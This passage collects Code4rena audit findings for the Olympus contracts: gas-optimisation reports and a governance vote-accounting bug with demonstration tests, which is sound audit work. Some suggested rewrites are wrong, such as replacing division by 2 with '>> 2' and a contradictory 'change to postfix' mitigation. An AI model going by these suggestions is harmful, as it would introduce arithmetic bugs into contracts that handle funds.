Storage Slots - Unchanging State Variable Should be Immutable - Change Function Visibility Public to External - Internal Function Called Only Once can be Inlined - Use Bit Shifting Instead of Multiplication/Division of 2 - Use Calldata instead of Memory for Read Only Function Parameters - Boolean Comparisons - Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas - Unnecessary Default Value Initialization - Store Array's Length as a Variable - ++i Costs Less Gas than i++  &ensp; ### Storage Variables can be Packed into Fewer Storage Slots  #### Issue The order of storage variables can be reordered in a way to reduce the usage amount of storage slots. ``` Reference from solidity documentation: Finally, in order to allow the EVM to optimize for this, ensure that you try to order your storage  variables and struct members such that they can be packed tightly. For example, declaring your  storage variables in the order of uint128, uint128, uint256 instead of uint128, uint256, uint128,  as the former will only take up two slots of storage whereas the latter will take up three. ``` https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage  #### PoC Total of 1 instance found.  1. OlympusHeart Contract We can save 1 storage slot by reordering it like below. Move bool variable (1 byte size) to pack it with address variable (20 bytes size).  Before: https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48  Change to: ```solidity     /// @notice Timestamp of the last beat (UTC, in seconds)     uint256 public lastBeat;      /// @notice Reward for beating the Heart (in reward token decimals)     uint256 public reward;      /// @notice Reward token address that users are sent for beating the Heart     ERC20 public rewardToken;      /// @notice Status of the Heart, false = stopped, true = beating     bool public active;      // Modules     OlympusPrice internal PRICE;      // Policies     IOperator internal _operator; ```  #### Mitigation Reorder storage variables like shown in above PoC.  &ensp; ### Unchanging State Variable Should be Immutable  #### Issue State variable that is only set in the constructor and can't be changed afterwards, should be declared as immutable.  #### PoC Total of 2 instances found.  1. ohm variable of BondCallback.sol https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L32  2. aggregator variable of BondCallback.sol https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28  #### Mitigation Change to immutable.  &ensp; ### Change Function Visibility Public to External  #### Issue If the function is not called internally, it is cheaper to set your function visibility to external instead of public.  #### PoC Total of 4 instances found.  1. Governance.sol:getMetadata() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145  2. Governance.sol:getActiveProposal() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L151  3. Kernel.sol:grantRole() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L439  4. Kernel.sol:revokeRole() https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L451   #### Mitigation Change the function visibility to external.  &ensp; ### Internal Function Called Only Once Can be Inlined  #### Issue Certain function is defined even though it is called only once. Inline it instead to where it is called to avoid usage of extra gas.  #### PoC Total of 9 instances found.  1. _issueReward() of Heart.sol this function called only once at line 106 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106  2. _addObservation() of Operator.sol this function called only once at line 201 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L652-L695 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L201  3. _installModule() of Kernel.sol this function called only once at line 239 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L266-L277 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L239  4. _upgradeModule() of Kernel.sol this function called only once at line 243 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L279-L293 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L243  5. _activatePolicy() of Kernel.sol this function called only once at line 246 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L295-L315 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L246  6. _deactivatePolicy() of Kernel.sol this function called only once at line 249 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L325-L346 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L249  7. _migrateKernel() of Kernel.sol this function called only once at line 256 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L351-L372 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L256  8. _reconfigurePolicies() of Kernel.sol this function called only once at line 292 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L378-L389 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L292  9. _pruneFromDependents() of Kernel.sol this function called only once at line 342 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L409-L432 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L342  #### Mitigation I recommend to not define above functions and instead inline it at place it is called.  &ensp; ### Use Bit Shifting Instead of Multiplication/Division of 2  #### Issue The MUL and DIV opcodes cost 5 gas but SHL and SHR only costs 3 gas. Since MUL/DIV and SHL/SHR result the same, use cheaper bit shifting.  #### PoC Total of 5 instances found. ```solidity ./Operator.sol:372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); ./Operator.sol:427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ./Operator.sol:419:            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; ./Operator.sol:420:            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; ./Operator.sol:786:                ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  #### Mitigation Use bit shifting instead of multiplication/division. Example: ```solidity uint256 center = upper - (upper - lower) / 2;  Good: uint256 center = upper - (upper - lower) >> 2;  ```  &ensp; ### Use Calldata instead of Memory for Read Only Function Parameters  #### Issue It is cheaper gas to use calldata than memory if the function parameter is read only. Calldata is a non-modifiable, non-persistent area where function arguments are stored,  and behaves mostly like memory. More details on following link. link: https://docs.soliditylang.org/en/v0.8.15/types.html#data-location  #### PoC Total of 4 instances found. ``` ./Governance.sol:162:        string memory proposalURI_ ./PRICE.sol:205:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) ./TreasuryCustodian.sol:53:    function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external { ./BondCallback.sol:152:    function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") { ```  #### Mitigation Change memory to calldata  &ensp; ### Boolean Comparisons  #### Issue It is more gas expensive to compare boolean with \"variable == true\" or \"variable == false\" than  directly checking the returned boolean value.  #### PoC Total of 2 instances found.  ``` ./Governance.sol:223:        if (proposalHasBeenActivated[proposalId_] == true) { ./Governance.sol:306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  #### Mitigation Simply check by returned boolean value. Change it to ``` if (proposalHasBeenActivated[proposalId_]) ```  &ensp; ### Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas  #### Issue Since EVM operates on 32 bytes at a time, if the element is smaller than that, the EVM must use more operations in order to reduce the elements from 32 bytes to specified size.  Reference: https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html  #### PoC Total of 42 instances found. ``` ./PriceConfig.sol:58:    function changeMovingAverageDuration(uint48 movingAverageDuration_) ./PriceConfig.sol:69:    function changeObservationFrequency(uint48 observationFrequency_) ./IOperator.sol:85:    function setCushionFactor(uint32 cushionFactor_) external; ./IOperator.sol:93:        uint32 duration_, ./IOperator.sol:94:        uint32 debtBuffer_, ./IOperator.sol:95:        uint32 depositInterval_ ./IOperator.sol:101:    function setReserveFactor(uint32 reserveFactor_) external; ./IOperator.sol:110:        uint32 wait_, ./IOperator.sol:111:        uint32 threshold_, ./IOperator.sol:112:        uint32 observe_ ./TRSRY.sol:51:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./VOTES.sol:27:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./MINTR.sol:25:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./PRICE.sol:27:    event MovingAverageDurationChanged(uint48 movingAverageDuration_); ./PRICE.sol:28:    event ObservationFrequencyChanged(uint48 observationFrequency_); ./PRICE.sol:75:        uint48 observationFrequency_, ./PRICE.sol:76:        uint48 movingAverageDuration_ ./PRICE.sol:84:        uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals(); ./PRICE.sol:87:        uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals(); ./PRICE.sol:113:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ./PRICE.sol:127:        uint32 numObs = numObservations; ./PRICE.sol:185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; ./PRICE.sol:240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned { ./PRICE.sol:266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned { ./Operator.sol:51:    event CushionFactorChanged(uint32 cushionFactor_); ./Operator.sol:52:    event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_); ./Operator.sol:53:    event ReserveFactorChanged(uint32 reserveFactor_); ./Operator.sol:54:    event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_); ./Operator.sol:97:        uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve] ./Operator.sol:418:            uint8 oracleDecimals = PRICE.decimals(); ./Operator.sol:516:    function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") { ./Operator.sol:528:        uint32 duration_, ./Operator.sol:529:        uint32 debtBuffer_, ./Operator.sol:530:        uint32 depositInterval_ ./Operator.sol:548:    function setReserveFactor(uint32 reserveFactor_) external onlyRole(\"operator_policy\") { ./Operator.sol:560:        uint32 wait_, ./Operator.sol:561:        uint32 threshold_, ./Operator.sol:562:        uint32 observe_ ./Operator.sol:665:        uint32 observe = _config.regenObserve; ./INSTR.sol:28:    function VERSION() public pure override returns (uint8 major, uint8 minor) { ./Kernel.sol:100:    function VERSION() external pure virtual returns (uint8 major, uint8 minor) {} ./RANGE.sol:115:    function VERSION() external pure override returns (uint8 major, uint8 minor) { ```  #### Mitigation I suggest using uint256 instead of anything smaller or downcast where needed.  &ensp; ### Unnecessary Default Value Initialization  #### Issue When variable is not initialized, it will have its default values. For example, 0 for uint, false for bool and address(0) for address. Reference: https://docs.soliditylang.org/en/v0.8.15/control-structures.html#scoping-and-declarations  #### PoC Total of 3 instances found. ``` ./KernelUtils.sol:43:    for (uint256 i = 0; i < 5; ) { ./KernelUtils.sol:58:    for (uint256 i = 0; i < 32; ) { ./Kernel.sol:397:        for (uint256 i = 0; i < reqLength; ) { ```  #### Mitigation I suggest removing default value initialization. For example, - for (uint256 i; i < 5; ) {  &ensp; ### Store Array's Length as a Variable   #### Issue By storing an array's length as a variable before the for-loop, can save 3 gas per iteration.  #### PoC Total of 1 instance found. ``` ./Governance.sol:278:        for (uint256 step; step < instructions.length; ) { ```  #### Mitigation Store array's length as a variable before looping it. For example, I suggest changing it to ``` uint256 length = instructions.length; for (uint256 step; step < length; ) { ```  &ensp; ### ++i Costs Less Gas than i++  #### Issue Prefix increments/decrements (++i or --i) costs cheaper gas than  postfix increment/decrements (i++ or i--).  #### PoC Total of 7 instances found. ``` ./KernelUtils.sol:49:            i++; ./KernelUtils.sol:64:            i++; ./Operator.sol:488:            decimals++; ./Operator.sol:670:                _status.low.count++; ./Operator.sol:686:                _status.high.count++; ./Operator.sol:675:                _status.low.count--; ./Operator.sol:691:                _status.high.count--; ```  #### Mitigation Change it to postfix increments/decrements. It saves 6 gas per loop.  &ensp;"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/294", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": " # PREFIX INCREMENTS   IMPACT   Prefix increments are cheaper than postfix increments.    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L49    i++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L64    i++;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L488    decimals++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L670    _status.low.count++;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L686    _status.high.count++;  Mitigation:   replace foo++ to ++foo    # DEFAULT VALUE INITIALIZATION   IMPACT    If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.     Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/Kernel.sol#L397    for (uint256 i = 0; i < reqLength; ) {   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L43    for (uint256 i = 0; i < 5; ) {        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/utils/KernelUtils.sol#L58    for (uint256 i = 0; i < 32; ) {        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L574    _status.high.count = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L575    _status.high.nextObservation = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L578    _status.low.count = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L579    _status.low.nextObservation = 0;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L254    _movingAverage = 0;   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L286    _movingAverage = 0;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/RANGE.sol#L135    _range.high.active = false;        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/RANGE.sol#L147    _range.low.active = false;        Mitigation:   Remove explicit value initialization.     # COMPARISON OPERATORS   IMPACT    In the EVM, there is no opcode for >= or <=. When using greater than or equal, two operations are performed: > and =.    Using strict comparison operators hence saves gas.        Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L210    uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L211    _status.high.count >= config_.regenThreshold    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L216    uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L217    _status.low.count >= config_.regenThreshold    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L486    while (price_ >= 10) {    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L667    if (currentPrice >= movingAverage) {    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Operator.sol#L683    if (currentPrice <= movingAverage) {    Mitigation:   Replace <= with <, and >= with >. Do not forget to increment/decrement the compared variable        # COMPARISON WITH ZERO   IMPACT    >0 is less gas efficient than !0 if you enable the optimizer at 10k AND you\u2019re in a require statement. Detailed explanation with the opcodes [here](https://twitter.com/gzeon/status/1485428085885640706)   Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L247    if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {    Mitigation:    Replace >0 with !0    # Increment/decrement operations   IMPACT     X = X + Y IS CHEAPER THAN X += Y     X = X- Y IS CHEAPER THAN X -= Y     Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L194    totalEndorsementsForProposal[proposalId_] -= previousEndorsement;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L198    totalEndorsementsForProposal[proposalId_] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L252    yesVotesForProposal[activeProposal.proposalId] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Governance.sol#L254    noVotesForProposal[activeProposal.proposalId] += userVotes;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/Heart.sol#L103    lastBeat += frequency();    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/BondCallback.sol#L143    _amountsPerMarket[id_][0] += inputAmount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/policies/BondCallback.sol#L144    _amountsPerMarket[id_][1] += outputAmount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L96    reserveDebt[token_][msg.sender] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L97    totalDebt[token_] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L115    reserveDebt[token_][msg.sender] -= received;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L116    totalDebt[token_] -= received;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L131    if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/TRSRY.sol#L132    else totalDebt[token_] -= oldDebt - amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/VOTES.sol#L56    balanceOf[from_] -= amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/VOTES.sol#L58    balanceOf[to_] += amount_;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L136    _movingAverage += (currentPrice - earliestPrice) / numObs;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L138    _movingAverage -= (earliestPrice - currentPrice) / numObs;    Instance: https://github.com/code-423n4/2022-08-olympus/tree/main/src/modules/PRICE.sol#L222    total += startObservations_[i];    Mitigation:    X += Y replace with X = X + Y    X -= Y replace with X = X - Y     "}, {"title": "Voted votes cannot change after the user are issued with new votes or the user's old votes are revoked during voting", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/275", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56   # Vulnerability details  ## Impact A user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          if (for_) {             yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;         }          userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;          VOTES.transferFrom(msg.sender, address(this), userVotes);          emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 ```solidity     function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {         // Issue the votes in the VOTES module         VOTES.mintTo(wallet_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56 ```solidity     function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {         // Revoke the votes in the VOTES module         VOTES.burnFrom(wallet_, amount_);     } ```  ## Proof of Concept Please add the following code in `src\\test\\policies\\Governance.t.sol`.  First, please add the following code for `stdError`. ```solidity import {Test, stdError} from \"forge-std/Test.sol\";    // @audit import stdError for testing purpose ```  Then, please append the following tests. These tests will pass to demonstrate the described scenarios. ```solidity     function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here         vm.prank(godmode);         VOTES.mintTo(voter3, 500);         assertEq(VOTES.balanceOf(voter3), 500);          // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes         vm.expectRevert(UserAlreadyVoted.selector);         vm.prank(voter3);         governance.vote(true);     } ```  ```solidity     function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.         // However, calling VOTES.burnFrom will revert due to arithmetic underflow.         vm.prank(godmode);         vm.expectRevert(stdError.arithmeticError);         VOTES.burnFrom(voter3, 300);          // the proposal is still voted with voter3's previous votes afterwards         assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/269", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | [G&#x2011;01] | State variables should only be updated once in a function | 1 | | [G&#x2011;02] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | | [G&#x2011;03] | State variables only set in the constructor should be declared `immutable` | 11 | | [G&#x2011;04] | State variables can be packed into fewer storage slots | 1 | | [G&#x2011;05] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 5 | | [G&#x2011;06] | Using `storage` instead of `memory` for structs/arrays saves gas | 4 | | [G&#x2011;07] | State variables should be cached in stack variables rather than re-reading them from storage | 7 | | [G&#x2011;08] | Multiple accesses of a mapping/array should use a local variable cache | 1 | | [G&#x2011;09] | The result of function calls should be cached rather than re-calling the function | 3 | | [G&#x2011;10] | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 3 | | [G&#x2011;11] | `internal` functions only called once can be inlined to save gas | 9 | | [G&#x2011;12] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 1 | | [G&#x2011;13] | `<array>.length` should not be looked up in every loop of a `for`-loop | 1 | | [G&#x2011;14] | Optimize names to save gas | 20 | | [G&#x2011;15] | Using `bool`s for storage incurs overhead | 11 | | [G&#x2011;16] | Use a more recent version of solidity | 3 | | [G&#x2011;17] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 7 | | [G&#x2011;18] | Using `private` rather than `public` for constants, saves gas | 11 | | [G&#x2011;19] | Don't compare boolean expressions to boolean literals | 2 | | [G&#x2011;20] | Division by two should use bit shifting | 2 | | [G&#x2011;21] | Superfluous event fields | 7 | | [G&#x2011;22] | Functions guaranteed to revert when called by normal users can be marked `payable` | 36 |  Total: 147 instances over 22 issues  The source diffs can be directly applied to the code by putting the diff block into a file then doing `git apply <file>`  ## Gas Optimizations  ### [G&#x2011;01]  State variables should only be updated once in a function `totalEndorsementsForProposal` is updated twice in this function, but it could be optimized to only update the difference between `previousEndorsement` and `userVotes` instead. Futher optimizations would be to use a `storage` variable rather than looking up the hash of `totalEndorsementsForProposal[proposalId_]` each time, and to use `x = x + a` rather than `x += a`  *There is 1 instance of this issue:* ```solidity File: /src/policies/Governance.sol  192          // undo any previous endorsement the user made on these instructions 193          uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; 194          totalEndorsementsForProposal[proposalId_] -= previousEndorsement; 195   196          // reapply user endorsements with most up-to-date votes 197          userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; 198:         totalEndorsementsForProposal[proposalId_] += userVotes;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L192-L198  ```diff diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..c0e783f 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -191,11 +191,14 @@ contract OlympusGovernance is Policy {            // undo any previous endorsement the user made on these instructions          uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; -        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;            // reapply user endorsements with most up-to-date votes          userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; -        totalEndorsementsForProposal[proposalId_] += userVotes; +        if (previousEndorsement > userVotes) { +            totalEndorsementsForProposal[proposalId_] -= (previousEndorsement - userVotes); +        } else { +            totalEndorsementsForProposal[proposalId_] += (userVotes - previousEndorsement); +        }            emit ProposalEndorsed(proposalId_, msg.sender, userVotes);      } ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..828386f 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -289,7 +289,7 @@  \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561  \u2502 Deployment Cost                                        \u2506 Deployment Size \u2506        \u2506        \u2506        \u2506         \u2502  